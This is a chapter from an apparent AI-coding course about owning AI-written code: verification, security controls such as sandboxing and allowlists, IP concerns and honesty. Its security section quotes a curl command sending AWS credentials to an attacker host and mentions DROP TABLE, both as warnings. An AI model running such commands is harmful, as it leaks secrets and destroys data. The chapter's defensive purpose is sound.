---
title: 'Chapter 11 — Code of Conduct — Being Responsible'
date: 2026-06-25
tags: [Teaching, AI-Coding-Guide, Seven-Liberal-Arts, Trivium-Logic]
type: note
sources: []
status: stable
course: AI Coding Guide
chapter: 11
liberal_art: Trivium-Logic
audience: professional
---

# Chapter 11 — Code of Conduct — Being Responsible

## The uncomfortable truth

Every line of code an AI agent writes for you is your code. Not "the AI's code." Yours. The instant you merge it, you own it — for better, for worse, for the bug report six months later, for the security incident next year, for the IP claim from a third party, for the customer who depends on it. "The AI wrote it" is not a defense, has never been a defense, and will never be a defense.

This chapter is about what that ownership actually requires in practice. It is the most important chapter in the guide, and if you only re-read one, re-read this one.

---

## 1. Verification — the only non-negotiable

The single biggest mistake people make with AI coding tools is treating the output as finished because it *looks* finished. It doesn't compile? It compiles but doesn't run? It runs but produces wrong output? It runs correctly but for the wrong reasons? It runs correctly and correctly but introduces a subtle race condition that will bite in production? These are all things that happen, with regularity, in 2026.

Verification is the answer to all of them, and verification is not optional.

### What verification looks like in practice

- **Read the diff.** Every line. Not "skim the diff." Read it. If you wouldn't accept this diff from a junior engineer without reading it, don't accept it from an agent.
- **Run the tests.** If there are tests for the changed code, run them. If there aren't, write them — the agent can help. Tests passing is necessary but not sufficient.
- **Run the full suite.** A change can pass its own tests and break something far away. The full suite catches that.
- **Run the linter and type checker.** Agents will produce code that "works" but violates your project's conventions. Linters exist to catch this; use them.
- **For non-trivial changes, actually run the feature.** Tests are a proxy for "it works." Running the thing is the real check. Do both.
- **For risky changes, get a second pair of eyes.** A human reviewer. Or, if you're solo, ask a *different* agent (fresh context) to review the first agent's work. The second agent will catch things the first missed — sometimes a lot.

### The "looks done but isn't" failure mode

This deserves its own heading because it's the signature failure of AI coding. Agents are very good at producing output that *looks* correct — well-structured, sensibly named, plausible logic, all the right patterns. The surface quality is high. The actual correctness is sometimes much lower than the surface suggests.

The defense is to treat "looks done" as the *start* of verification, not the end. A junior engineer's code that "looks done" gets reviewed carefully because you know juniors make mistakes. An agent's code that "looks done" deserves the same care, for the same reason — and the high surface quality makes the care *harder* to remember to apply, not easier. Build the habit anyway.

---

## 2. Security

Agents can introduce security vulnerabilities in two ways: by writing insecure code (same as a junior engineer), and by doing insecure things in the process of writing code (unique to agents). Both need defending against.

### Insecure code

The classic categories apply: SQL injection, XSS, auth bypass, secrets in logs, insecure deserialization, path traversal, the whole OWASP Top 10. Modern models are *decent* at avoiding the obvious ones, but they still slip, especially in less common languages or frameworks where training data is thinner. Your existing security review process applies. Don't weaken it because "the AI wrote it."

One thing to watch for specifically: agents love to add dependencies. Every added dependency is a supply-chain risk. Review dependency additions as carefully as you'd review them in a human PR — sometimes more carefully, because the agent isn't weighing the cost.

### Insecure process

This is the new risk. An agent with filesystem access can read your `.env` file. An agent with shell access can run `curl https://attacker.com/$(cat ~/.aws/credentials)`. An agent with a Slack [[mcp-anthropic-standard|MCP]] server can post secrets to a channel. An agent connected to your database can run `DROP TABLE`.

Defenses, in roughly increasing order of strength:

- **Permission prompts.** Configure your harness to ask before any shell command, before any file write outside the project, before any destructive MCP tool call. The friction is worth it.
- **Allowlists.** "These shell commands are pre-approved; everything else, ask." Better than prompts alone, because you stop clicking "yes" reflexively.
- **Sandboxing.** Run the agent (or its tool calls, or specific MCP servers) in a container, a VM, or a network-restricted zone. The agent can do what it wants in the sandbox; it can't reach production. This is the strongest practical defense and the one recommended for anything beyond casual use.
- **Read-only by default for sensitive sources.** Database MCP servers should be configured read-only. Git MCP servers shouldn't have push to `main`. Slack MCP servers shouldn't have post to #general.
- **Never let an agent hold production credentials.** If your agent needs database access, give it a read-only user on a replica, not the prod connection string.

The principle: **the agent's blast radius should be smaller than your tolerance for damage.** If you wouldn't trust a brand-new junior engineer with that access, don't give it to an agent.

### A note on MCP server trust

MCP servers (Chapter 7) are code. They can do anything their author wrote. A malicious or buggy MCP server is a supply-chain risk, same as a malicious or buggy npm package. Before connecting one:

- Check who maintains it and whether it's widely used.
- Read what it actually does, if you can.
- Run it in a sandbox if possible.
- Give it the minimum credentials it needs, scoped as tightly as possible.

The MCP ecosystem is young; the catalog of servers is still mostly written by individuals. Treat it accordingly.

---

## 3. Intellectual property

Three distinct concerns, often conflated. Separate them.

### a) Training data and the model's output

Models are trained on large corpora that include open-source code, possibly including code under licenses with attribution or copyleft requirements. Whether model output can itself infringe on the training data's license is an active legal question, not a settled one. The practical stance most organizations take: treat AI-generated code the same way you'd treat code from any other external source, with the same IP and licensing review you'd apply to a dependency. If your project can't accept code of unknown provenance, it can't blindly accept AI output either.

### b) Putting IP *into* the model

If you paste your employer's proprietary source code into a web-based chat tool, you may have just sent it to a third party. Whether that's a problem depends on your employment contract, your employer's policies, the tool's terms of service, and your jurisdiction. Find out *before* you paste, not after. Many employers have explicit lists of what may and may not be sent to which services. Respect them.

For terminal and IDE-integrated agents, the question is which API the harness calls and what that provider's terms say about retention and training. The frontier providers have enterprise tiers with strong no-retention and no-training guarantees; if you're handling sensitive code, you should be on one.

### c) Attribution and honesty

If a substantial portion of a file was written by an agent, that's worth knowing for the next person who touches it. Some teams require attribution in commit messages (`Co-authored-by: Claude`); some don't. Some require it for substantial generated blocks; some treat it like any other tool output. The honest minimum: don't claim authorship of code you didn't write, and don't hide AI involvement when disclosure is expected by your team or your contracts.

---

## 4. Honesty with yourself and others

The hardest part of responsible AI coding is not a technical control — it's a habit of mind. Specifically: **don't let the speed and confidence of the agent substitute for your own understanding.**

It is very easy, especially when the agent is producing high-surface-quality output, to accept changes you don't fully follow. The change *looks* right; the tests pass; the diff isn't that big; you'd feel silly asking the agent to explain it. So you merge. Six months later, the change breaks, and you don't know why, because you never actually understood it.

The defensive habit is simple to state and hard to practice: **if you can't explain why a change works, don't merge it.** Either understand it (ask the agent to explain; read the code; experiment), or reject it. "The AI said it would work" is not an explanation. "I read the diff and I understand why this line is here and what it does" is.

This matters most for:

- Code in security-sensitive paths (auth, crypto, input handling).
- Code in performance-sensitive paths (hot loops, database queries).
- Code in areas you don't already understand well.
- Code that "just works" without a clear reason. (This is a red flag, not a green one.)

For boilerplate, obvious changes, and areas you know cold, the bar can be lower. For everything else, hold the line. The cost of understanding a change now is much lower than the cost of debugging it later when you don't know why it's there.

---

## 5. What you're actually responsible for

To make it explicit, because the speed of AI coding makes it easy to forget:

- **You are responsible for the code that ships,** regardless of who or what wrote it.
- **You are responsible for the tests passing,** not just the tests the agent wrote (it may have written tests that pass trivially).
- **You are responsible for security,** even if the agent introduced the vulnerability.
- **You are responsible for the dependencies added,** even if the agent added them without asking.
- **You are responsible for the IP and licensing posture,** even if the model produced the code.
- **You are responsible for the consequences** when the code runs in production.

The agent is a tool. You are the engineer. Tools don't absolve engineers of responsibility for what they build with them; a power saw doesn't make the carpenter less responsible for the joint. The agent is a more powerful and more *convincing* tool than most, which makes the responsibility *harder* to remember, not smaller.

---

## 6. A short code of conduct

If this chapter had to be one paragraph:

> **Verify everything. Sandbox what you can. Read the diff. Run the tests. Understand the code before you merge it. Treat AI output like external code of unknown provenance. Don't paste secrets into third-party services. Don't accept changes you can't explain. Remember that the agent is fast and confident and frequently wrong, and that "the AI wrote it" is never a defense. You own every line that ships. Act like it.**

That's the whole chapter. The rest was elaboration.
